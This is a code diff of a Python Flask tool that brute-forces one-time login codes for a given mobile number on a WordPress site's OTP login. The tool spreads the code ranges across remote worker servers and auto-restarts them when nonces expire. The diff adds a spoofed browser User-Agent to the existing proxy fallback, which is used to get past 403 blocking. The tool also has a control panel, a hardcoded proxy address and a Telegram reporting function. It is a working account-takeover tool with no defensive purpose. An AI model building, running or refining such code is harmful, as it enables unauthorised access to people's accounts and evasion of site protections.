@@ -101,16 +101,19 @@ def send_to_telegram(message):
         return False
 
 def fetch_nonce(host, mobile):
-    """Fetches the login_otp_nonce from the target website, with proxy fallback for 403 errors."""
+    """Fetches the login_otp_nonce from the target website, with proxy fallback and custom User-Agent."""
     try:
         use_proxy = False
-        # Corrected proxy URL format as identified by the user
         base_proxy_url = "https://go.tensha.ir/proxy/https://"
+        
+        # Define a common browser User-Agent to avoid being blocked.
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+        }
 
         def get_url(base_url):
             """Constructs the correct URL, applying proxy if needed."""
             if use_proxy:
-                # The proxy expects the target URL without its own protocol part
                 return base_proxy_url + base_url.replace('https://', '')
             return base_url
 
@@ -119,7 +122,7 @@ def fetch_nonce(host, mobile):
         
         try:
             # First attempt without proxy
-            response = requests.get(login_page_url, timeout=15)
+            response = requests.get(login_page_url, headers=headers, timeout=15)
             response.raise_for_status()
         except requests.exceptions.HTTPError as e:
             if e.response.status_code == 403:
@@ -127,10 +130,10 @@ def fetch_nonce(host, mobile):
                 use_proxy = True
                 proxied_url = get_url(login_page_url)
                 app_state.add_log(f"🔄 Using proxy URL: {proxied_url}")
-                response = requests.get(proxied_url, timeout=25)  # Increased timeout for proxy
+                response = requests.get(proxied_url, headers=headers, timeout=25)
                 response.raise_for_status()
             else:
-                raise  # Re-raise other HTTP errors
+                raise
 
         soup = BeautifulSoup(response.text, 'html.parser')
         user_login_nonce_element = soup.find('input', {'id': 'user_login_nonce'})
@@ -141,18 +144,20 @@ def fetch_nonce(host, mobile):
 
         # Step 2: Send initial login request to get OTP sent
         ajax_url = f"https://{host}/wp-admin/admin-ajax.php"
-        headers = {
+        # Update headers for AJAX request
+        ajax_headers = headers.copy()
+        ajax_headers.update({
             "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
             "X-Requested-With": "XMLHttpRequest",
-            "Referer": login_page_url  # Referer should be the original URL
-        }
+            "Referer": login_page_url
+        })
         login_data = f"user_login_nonce={user_login_nonce}&_wp_http_referer=%2Flogin%2F&action=kandopanel_user_login&redirect=&log={mobile}&pwd=&otp=1"
         
-        requests.post(get_url(ajax_url), headers=headers, data=login_data, timeout=20)
+        requests.post(get_url(ajax_url), headers=ajax_headers, data=login_data, timeout=20)
 
         # Step 3: Get the login_otp_nonce from the OTP page
         otp_page_url = f"https://{host}/login/?action=login-by-otp&mobile={mobile}"
-        response = requests.get(get_url(otp_page_url), timeout=20)
+        response = requests.get(get_url(otp_page_url), headers=headers, timeout=20)
         response.raise_for_status()
         soup = BeautifulSoup(response.text, 'html.parser')
         
@@ -203,7 +208,6 @@ def get_workers_status():
             status = response.json()
             status_data[server] = status
             
-            # Check for success message in the error field (as per original logic)
             if status.get("error") and "found successfully" in status["error"]:
                 code = status["error"].split("Code ")[1].split(" found")[0]
                 app_state.add_log(f"🎉 Success on {server}! Code: {code}. Stopping all workers...")
@@ -230,15 +234,13 @@ def operation_manager(operation_details):
     """Manages the lifecycle of an OTP cracking operation, including auto-restart."""
     app_state.add_log("🔄 Operation Manager Started.")
     
-    # The main loop for the operation, allows for retries.
-    for attempt in range(1, 4): # Max 3 attempts
+    for attempt in range(1, 4):
         if app_state.stop_event.is_set():
             app_state.add_log("Operation cancelled before starting.")
             break
 
         app_state.add_log(f"🚀 Starting attempt #{attempt}...")
 
-        # Start workers
         threads = []
         for i, server in enumerate(REMOTE_SERVERS):
             start_r, end_r = operation_details['ranges'][i]
@@ -252,34 +254,31 @@ def operation_manager(operation_details):
             thread.start()
         for thread in threads: thread.join()
 
-        # Wait for either success, timeout, or manual stop
-        # Timeout is 40 minutes as per original logic
         stopped = app_state.stop_event.wait(timeout=40 * 60)
 
         if stopped:
             if app_state.found_success:
                 app_state.add_log("✅ Operation successful! Manager shutting down.")
-                break # Exit the loop on success
+                break
             else:
                 app_state.add_log("⏹️ Operation stopped manually. Manager shutting down.")
-                break # Exit on manual stop
-        else: # Timeout occurred
+                break
+        else: 
             app_state.add_log("⏳ Timeout reached (40 mins). Stopping workers for restart.")
             stop_all_workers()
-            time.sleep(5) # Grace period for workers to stop
+            time.sleep(5)
 
             app_state.add_log("🔄 Attempting to fetch a new nonce for restart...")
             new_nonce = fetch_nonce(operation_details['host'], operation_details['mobile'])
             if new_nonce:
                 operation_details['nonce'] = new_nonce
                 app_state.add_log("✅ New nonce acquired. Restarting operation.")
-                # The loop will continue to the next attempt
             else:
                 app_state.add_log("❌ Failed to get new nonce. Aborting operation.")
-                break # Exit loop if nonce fetch fails
+                break
 
     app_state.add_log("🔚 Operation Manager Finished.")
-    stop_all_workers() # Final cleanup
+    stop_all_workers()
 
 # ==============================================================================
 # Flask Routes
@@ -287,7 +286,6 @@ def operation_manager(operation_details):
 
 @app.route('/')
 def index():
-    # Modern UI with TailwindCSS and better layout
     return render_template_string('''
     <!DOCTYPE html>
     <html lang="fa" dir="rtl">
@@ -338,7 +336,6 @@ def index():
                             <input type="text" id="proxy" class="mt-1 block w-full bg-gray-700 border-gray-600 rounded-md shadow-sm p-2" placeholder="socks5://user:pass@host:port" value="51.195.229.194:13001">
                         </div>
                         
-                        <!-- Scan Type -->
                         <fieldset>
                             <legend class="block text-sm font-medium text-gray-300 mb-2">نوع اسکن</legend>
                             <div class="flex items-center space-x-4 space-x-reverse">
@@ -351,7 +348,6 @@ def index():
                             <input type="number" id="end_range" class="w-full bg-gray-700 border-gray-600 rounded-md p-2" placeholder="پایان">
                         </div>
 
-                        <!-- Action Buttons -->
                         <div class="pt-4 space-y-3">
                             <button type="button" id="start-btn" class="w-full flex justify-center items-center bg-green-600 hover:bg-green-700 text-white font-bold py-2 px-4 rounded-lg transition-colors">
                                 <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
@@ -367,7 +363,6 @@ def index():
 
                 <!-- Status & Logs -->
                 <div class="lg:col-span-2 space-y-8">
-                    <!-- Status Table -->
                     <div class="bg-gray-800 p-6 rounded-xl shadow-lg">
                         <h2 class="text-2xl font-bold mb-4">وضعیت سرورها</h2>
                         <div class="overflow-x-auto">
@@ -382,12 +377,10 @@ def index():
                                     </tr>
                                 </thead>
                                 <tbody id="status-body">
-                                    <!-- Status rows will be injected here -->
                                 </tbody>
                             </table>
                         </div>
                     </div>
-                    <!-- Success & Logs -->
                     <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
                         <div class="bg-gray-800 p-6 rounded-xl shadow-lg">
                             <h2 class="text-2xl font-bold mb-4">کدهای موفق</h2>
@@ -398,7 +391,6 @@ def index():
                         <div class="bg-gray-800 p-6 rounded-xl shadow-lg">
                              <h2 class="text-2xl font-bold mb-4">لاگ‌ها</h2>
                              <div id="logs-container" class="h-48 overflow-y-auto bg-gray-900 rounded-md p-2 space-y-1 text-sm">
-                                <!-- Logs will be injected here -->
                              </div>
                         </div>
                     </div>
@@ -496,7 +488,6 @@ def index():
                 }
             }
 
-            // Event Listeners
             document.querySelectorAll('input[name="scan_type"]').forEach(radio => {
                 radio.addEventListener('change', () => {
                     document.getElementById('custom_range_container').classList.toggle('hidden', radio.value !== 'custom');
@@ -549,11 +540,9 @@ def index():
                 setButtonState(false);
             });
 
-            // Socket.IO
             socket.on('connect', () => console.log('Connected to WebSocket.'));
             socket.on('update_progress', (data) => addLog(data.log));
 
-            // Initial load and periodic refresh
             setInterval(refreshData, 3000);
             refreshData();
         </script>
@@ -576,14 +565,12 @@ def start_operation():
     
     app_state.add_log(f"🚀 Operation initiated for host: {host}, mobile: {mobile}")
 
-    # Fetch nonce if not provided
     if not nonce:
         app_state.add_log("Nonce not provided, attempting to fetch automatically...")
         nonce = fetch_nonce(host, mobile)
         if not nonce:
             return jsonify({"error": "Failed to fetch nonce automatically."}), 400
 
-    # Determine ranges
     scan_type = data.get('scan_type', 'full')
     if scan_type == 'full':
         ranges = FULL_SCAN_RANGES
@@ -608,7 +595,6 @@ def start_operation():
     }
     app_state.current_operation = operation_details
 
-    # Start the background manager
     threading.Thread(target=operation_manager, args=(operation_details,)).start()
 
     return jsonify({"message": "Operation started successfully."}), 202
